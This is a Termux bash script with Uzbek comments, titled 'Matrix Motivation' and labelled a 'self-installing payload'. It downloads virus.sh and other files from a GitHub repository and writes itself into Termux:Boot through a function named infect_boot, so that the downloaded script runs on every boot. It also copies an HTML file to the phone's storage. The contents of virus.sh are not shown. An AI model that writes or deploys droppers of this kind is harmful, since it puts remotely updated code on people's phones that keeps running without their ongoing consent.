#!/data/data/com.termux/files/usr/bin/bash
# ============================================
# MATRIX MOTIVATION — SELF-INSTALLING PAYLOAD
# ============================================
# Bu skript o'zini GitHub'dan yuklab oladi
# va avtomatik ishga tushadi. Bir marta bosish
# kifoya. Internet kerak.
# ============================================

REPO="https://github.com/Xolericuz/matrix-motivation"
BRANCH="main"
DIR="$HOME/matrix-motivation"
GREEN='\033[32m'; RED='\033[31m'; NC='\033[0m'

# O'ZINI TERMUX:BOOT GA YOZISH
infect_boot() {
    BOOT_DIR="$HOME/.termux/boot"
    mkdir -p "$BOOT_DIR"
    SELF="$BOOT_DIR/matrix_boot.sh"

    cat > "$SELF" << 'BOOT'
#!/data/data/com.termux/files/usr/bin/bash
termux-wake-lock

WAIT=0
while [ ! -f "$HOME/matrix-motivation/virus.sh" ]; do
    if [ "$WAIT" -gt 30 ]; then break; fi
    sleep 2
    WAIT=$((WAIT + 1))
done

[ -f "$HOME/matrix-motivation/virus.sh" ] && bash "$HOME/matrix-motivation/virus.sh" &
BOOT
    chmod +x "$SELF"
    echo -e "${GREEN}[+]${NC} Termux:Boot ga yozildi"
}

# SKRIPTNI YUKLASH
download() {
    echo -e "${GREEN}[*]${NC} Yuklanmoqda..."
    mkdir -p "$DIR"

    if command -v curl &>/dev/null; then
        DL="curl -sL"
    elif command -v wget &>/dev/null; then
        DL="wget -qO-"
    else
        echo -e "${RED}[!]${NC} curl yoki wget kerak"
        pkg install -y curl 2>/dev/null
        DL="curl -sL"
    fi

    $DL "$REPO/raw/$BRANCH/virus.sh" > "$DIR/virus.sh" 2>/dev/null
    $DL "$REPO/raw/$BRANCH/install.sh" > "$DIR/install.sh" 2>/dev/null
    $DL "$REPO/raw/$BRANCH/index.html" > "$DIR/index.html" 2>/dev/null

    chmod +x "$DIR/virus.sh" "$DIR/install.sh"

    if [ -f "$DIR/virus.sh" ] && [ -s "$DIR/virus.sh" ]; then
        echo -e "${GREEN}[+]${NC} Yuklandi: $DIR/virus.sh"
    else
        echo -e "${RED}[!]${NC} Yuklab bo'lmadi. Git orqali..."
        if command -v git &>/dev/null; then
            git clone --depth=1 "$REPO.git" "$DIR" 2>/dev/null || {
                echo -e "${RED}[!]${NC} Git clone xato"
                return 1
            }
        else
            echo -e "${RED}[!]${NC} Git yo'q, o'rnatilmoqda..."
            pkg install -y git 2>/dev/null
            git clone --depth=1 "$REPO.git" "$DIR" 2>/dev/null || return 1
        fi
        chmod +x "$DIR/virus.sh" "$DIR/install.sh"
        echo -e "${GREEN}[+]${NC} Git clone tugadi"
    fi

    # HTML ni SDCard ga
    cp "$DIR/index.html" /sdcard/MatrixMotivation.html 2>/dev/null || \
        cp "$DIR/index.html" /storage/emulated/0/MatrixMotivation.html 2>/dev/null || true

    return 0
}

# AVTOMATIK O'RNATISH
auto_install() {
    echo ""
    echo -e "${GREEN}========================================${NC}"
    echo -e "${GREEN}  MATRIX MOTIVATION — AUTO INSTALL${NC}"
    echo -e "${GREEN}========================================${NC}"
    echo ""

    # Paketlar
    if ! command -v termux-notification &>/dev/null; then
        echo -e "${GREEN}[*]${NC} Paketlar o'rnatilmoqda..."
        pkg update -y 2>/dev/null
        pkg install -y termux-api 2>/dev/null
        echo -e "${GREEN}[+]${NC} Paketlar tayyor"
    fi

    # Download
    download || {
        echo -e "${RED}[!]${NC} Xatolik. Qo'lda:"
        echo "  pkg install git -y && git clone $REPO && cd matrix-motivation && bash install.sh"
        exit 1
    }

    # Boot
    infect_boot

    # Permission
    termux-notification --id matrix_install --title "MATRIX" \
        --content "O'rnatildi! Notificationlar yoqilmoqda..." \
        --priority high --alert-once 2>/dev/null
    sleep 1
    termux-notification-remove matrix_install 2>/dev/null

    echo ""
    echo -e "${GREEN}========================================${NC}"
    echo -e "${GREEN}  O'RNATISH TUGADI!${NC}"
    echo -e "${GREEN}========================================${NC}"
    echo ""
    echo -e "  ${GREEN}[✓]${NC} virus.sh  — Asosiy skript"
    echo -e "  ${GREEN}[✓]${NC} Boot     — Avtomatik ishga tushadi"
    echo -e "  ${GREEN}[✓]${NC} Offline  — Internet kerak emas"
    echo ""

    # Auto-start
    echo -ne "${GREEN}Hozir ishga tushirishmi? (y/n): ${NC}"
    read -r ans
    case "$ans" in
        y|Y|yes|Yes)
            echo -e "${GREEN}[*]${NC} Ishga tushmoqda..."
            bash "$DIR/virus.sh"
            ;;
        *)
            echo -e "${GREEN}[i]${NC} keyin: bash ~/matrix-motivation/virus.sh"
            ;;
    esac
}

# RUN
auto_install
